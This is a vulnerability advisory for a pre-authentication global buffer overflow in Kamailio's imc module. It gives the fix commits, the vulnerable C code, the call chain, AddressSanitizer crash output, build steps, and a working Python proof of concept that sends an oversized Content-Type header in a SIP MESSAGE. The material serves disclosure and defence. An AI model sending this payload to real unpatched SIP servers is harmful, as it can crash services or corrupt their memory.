# imc: Pre-auth global buffer overflow in build_headers() via Content-Type

**Module**: imc
**Severity**: High (pre-auth, 1071-byte write into 1024-byte global buffer)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Fixed in**: [`53b63b8f55`](https://github.com/kamailio/kamailio/commit/53b63b8f55) ("imc: Add length check")
**Committed**: 2026-05-04 14:46:55 UTC
**Stable backports**: Kamailio 6.1 [`6120325bde`](https://github.com/kamailio/kamailio/commit/6120325bdecf0bb33ec72ed43b9e1104ecdb9b6f) (2026-05-18) and Kamailio 6.0 [`fef62df95c`](https://github.com/kamailio/kamailio/commit/fef62df95c80d02145a2da2395f3572b29273876) (2026-06-16)
**Reproduction config**: [`kamailio-imc.cfg`](./kamailio-imc.cfg)

---

## Fix

The fix initializes the returned `str`, calculates the combined length of the configured headers, `Content-Type: ` prefix, and attacker-controlled Content-Type value before any `memcpy()`, and returns early when that length exceeds the 1024-byte static buffer. Commit [`e13c49fbce`](https://github.com/kamailio/kamailio/commit/e13c49fbce91511bd543e85eeca5dd4651340bec), committed on 2026-05-16, subsequently hardened the routine by building each header incrementally, reserving the final byte, and checking capacity before each component is appended.

`build_headers()` in `imc_cmd.c` copies three values into a 1024-byte static buffer via sequential `memcpy()` calls: a fixed header string (`all_hdrs`), the literal `"Content-Type: "`, and the full `Content-Type` header body from the incoming SIP message. The size check at line 128 occurs **after** all three `memcpy()` operations have already executed — it validates the total length too late to prevent the overflow.

An unauthenticated attacker sends a SIP MESSAGE addressed to an IMC chat room with a `Content-Type` header body exceeding ~985 bytes. The overflow corrupts adjacent global variables in the imc module's BSS segment.

## Vulnerable code

```c
// imc_cmd.c:110-128 — build_headers()
static char buf[1024];                                                       // line 110

// ...
memcpy(buf, all_hdrs.s, all_hdrs.len);                                       // line 117
memcpy(buf + all_hdrs.len, ctname.s, ctname.len);                            // line 118: "Content-Type: "
memcpy(buf + all_hdrs.len + ctname.len, msg->content_type->body.s,           // line 119: OVERFLOW
        msg->content_type->body.len);                                        // line 120

// ...
if(rv.len > sizeof(buf)) {    // line 128: TOO LATE — damage already done
    LM_ERR("...");
}
```

The check-after-write pattern means the overflow always occurs before the error condition is detected. The attacker controls `msg->content_type->body` — it is taken directly from the Content-Type header in the incoming SIP MESSAGE.

## Call chain

```
udp_rcv_loop()
  → receive_msg()
    → run_top_route()
      → do_action()                    [routing script: imc_manager()]
        → ki_imc_manager()
          → imc_handle_create()        (or any IMC command handler)
            → build_headers()          ← GLOBAL OVERFLOW
```

## PoC

```python
#!/usr/bin/env python3
"""
PoC: imc module build_headers() static buffer overflow
Target: kamailio with imc module loaded + MESSAGE routing to imc_manager()

Bug: imc_cmd.c build_headers() copies Content-Type header body into
static char buf[1024] via memcpy WITHOUT bounds check before the copy.
The size check at line 128 happens AFTER the memcpy at lines 117-120.

Trigger: Send MESSAGE with Content-Type header body > ~985 bytes.
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 5060

ct_padding = "A" * 1050
content_type = f"text/plain; overflow={ct_padding}"

body = "#create testroom"

msg = (
    f"MESSAGE sip:test@{TARGET} SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP 192.168.1.100:5060;branch=z9hG4bK-overflow-imc\r\n"
    f"From: <sip:attacker@{TARGET}>;tag=imc-of\r\n"
    f"To: <sip:test@{TARGET}>\r\n"
    f"Call-ID: imc-overflow-{ct_padding[:8]}@192.168.1.100\r\n"
    f"CSeq: 1 MESSAGE\r\n"
    f"Content-Type: {content_type}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Max-Forwards: 70\r\n"
    f"\r\n"
    f"{body}"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
print(f"[*] Sending MESSAGE with Content-Type body len={len(content_type)}")
sock.sendto(msg.encode(), (TARGET, PORT))

try:
    resp = sock.recv(4096)
    print(f"[*] Response: {resp[:80]}")
except socket.timeout:
    print("[*] No response (server may have crashed)")

sock.close()
```

## ASan output

Two reports fire: the initial WRITE overflow, then a READ when `_strnstr()` processes the corrupted buffer:

```
=================================================================
==7==ERROR: AddressSanitizer: global-buffer-overflow on address 0xffffa27f9b40 at pc 0xaaaae2a75b94 bp 0xffffce401540 sp 0xffffce400d30
WRITE of size 1071 at 0xffffa27f9b40 thread T0
    #0 0xaaaae2a75b90 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffffa27602f4 in build_headers /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:119:2
    #2 0xffffa2759078 in imc_handle_create /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:469:29
    #3 0xffffa2749bd4 in ki_imc_manager /usr/src/kamailio/build/src/modules/imc/imc.c:328:8
    #4 0xffffa2746a24 in w_imc_manager /usr/src/kamailio/build/src/modules/imc/imc.c:447:9
    #5 0xaaaae2ae858c in do_action /usr/src/kamailio/build/src/core/action.c:1123:4
    #6 0xaaaae2b0d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #7 0xaaaae2aecfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #8 0xaaaae2b0d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #9 0xaaaae2b10390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #10 0xaaaae3011c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #11 0xaaaae33011b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #12 0xaaaae2ac4b28 in main_loop /usr/src/kamailio/build/src/main.c
    #13 0xaaaae2adee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #14 0xffffa3d27740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #15 0xffffa3d27814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #16 0xaaaae29ff56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

0xffffa27f9b40 is located 0 bytes to the right of global variable 'buf' defined in '/usr/src/kamailio/src/modules/imc/imc_cmd.c:110:14' (0xffffa27f9740) of size 1024
SUMMARY: AddressSanitizer: global-buffer-overflow (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200ff44ff310: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff320: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff330: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff340: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff350: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff44ff360: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9
  0x200ff44ff370: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff44ff380: f9 f9 f9 f9 f9 f9 f9 f9 00 00 f9 f9 00 00 00 00
  0x200ff44ff390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
=================================================================
==7==ERROR: AddressSanitizer: global-buffer-overflow on address 0xffffa27f9b40 at pc 0xaaaae31a0cc0 bp 0xffffce400060 sp 0xffffce400058
READ of size 1 at 0xffffa27f9b40 thread T0
    #0 0xaaaae31a0cbc in _strnstr /usr/src/kamailio/build/src/core/str.c:63:28
    #1 0xffff9f1b0da8 in build_uac_req /usr/src/kamailio/build/src/modules/tm/t_msgbuilder.c:1711:7
    #2 0xffff9f2944c8 in t_uac_prepare /usr/src/kamailio/build/src/modules/tm/uac.c:603:8
    #3 0xffff9f29ec34 in t_uac_with_ids /usr/src/kamailio/build/src/modules/tm/uac.c:835:8
    #4 0xffff9f2b870c in t_uac /usr/src/kamailio/build/src/modules/tm/uac.c:817:9
    #5 0xffff9f2b870c in request /usr/src/kamailio/build/src/modules/tm/uac.c:1293:8
    #6 0xffffa2759188 in imc_send_message /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1672:2
    #7 0xffffa2759188 in imc_handle_create /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:468:3
    #8 0xffffa2749bd4 in ki_imc_manager /usr/src/kamailio/build/src/modules/imc/imc.c:328:8
    #9 0xffffa2746a24 in w_imc_manager /usr/src/kamailio/build/src/modules/imc/imc.c:447:9
    #10 0xaaaae2ae858c in do_action /usr/src/kamailio/build/src/core/action.c:1123:4
    #11 0xaaaae2b0d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #12 0xaaaae2aecfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #13 0xaaaae2b0d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #14 0xaaaae2b10390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #15 0xaaaae3011c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #16 0xaaaae33011b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #17 0xaaaae2ac4b28 in main_loop /usr/src/kamailio/build/src/main.c
    #18 0xaaaae2adee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #19 0xffffa3d27740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #20 0xffffa3d27814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #21 0xaaaae29ff56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

0xffffa27f9b40 is located 0 bytes to the right of global variable 'buf' defined in '/usr/src/kamailio/src/modules/imc/imc_cmd.c:110:14' (0xffffa27f9740) of size 1024
SUMMARY: AddressSanitizer: global-buffer-overflow /usr/src/kamailio/build/src/core/str.c:63:28 in _strnstr
Shadow bytes around the buggy address:
  0x200ff44ff310: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff320: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff330: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff340: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff350: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff44ff360: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9
  0x200ff44ff370: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff44ff380: f9 f9 f9 f9 f9 f9 f9 f9 00 00 f9 f9 00 00 00 00
  0x200ff44ff390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff44ff3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7==ABORTING
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

mkdir build && cd build
CC=clang cmake .. \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address"
make -j$(nproc) && make install

# kamailio.cfg must load imc and route MESSAGEs to imc_manager():
#   loadmodule "imc.so"
#   route { if(is_method("MESSAGE")) { imc_manager(); } }

ASAN_OPTIONS="detect_leaks=0:halt_on_error=0:log_path=/tmp/asan" \
    kamailio -DD -E -f kamailio.cfg

python3 poc.py 127.0.0.1
cat /tmp/asan.*
```
